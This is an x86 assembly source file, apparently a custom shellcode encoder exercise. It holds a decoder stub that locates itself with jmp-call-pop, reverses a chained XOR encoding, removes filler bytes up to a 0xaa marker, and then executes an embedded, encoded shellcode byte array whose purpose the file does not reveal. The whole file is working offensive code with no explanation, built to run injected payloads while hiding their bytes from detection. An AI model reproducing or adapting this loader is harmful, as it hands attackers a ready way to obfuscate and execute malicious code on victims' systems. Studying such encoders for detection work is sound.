    global _start

    section prog write exec

    _start:
            jmp short getpc

    start_decoder:
            pop esi
            push esi

    first_xor_loop:
            mov bl, [esi+1]
            xor [esi], bl
            inc esi
            cmp byte [esi-1], 0xaa
            jnz first_xor_loop

            pop eax
            mov edi, eax

    remove_filler:
            mov bl, byte [eax]              ;bl now to the first filler character
            xor bl, 0xaa                    ;this is how we know we've ended our shellcode (zeroflag would be set)
            jz short shellcode              ;if we have finished, then execute
            inc eax
            mov bl, byte [eax]              ;otherwise, move the next byte into bl
            mov byte [edi], bl              ;then move that byte from bl to the destination
            inc edi                         ;increment the destination
            inc eax                         ;increment the filler ctr by 2
            jmp short remove_filler         ;loop

    getpc:
            call start_decoder
            shellcode: db 0x02,0x01,0x30,0x96,0x56,0x17,0x47,0xc6,0xae,0x41,0x23,0x40,0x21,0xfe,0x8d,0x5e,0x36,0xba,0xd2,0x1c,0x7e,0x39,0x50,0x27,0x49,0x81,0xae,0x17,0x7f,0xfa,0xd5,0x4c,0x63,0x08,0x27,0x3f,0x10,0xef,0x66,0xde,0x3d,0xac,0xfc,0xb6,0x3f,0x6c,0x8e,0x2a,0x79,0x43,0xca,0x83,0x62,0x42,0xf2,0x63,0x68,0x8c,0x41,0x60,0xe0,0x4a
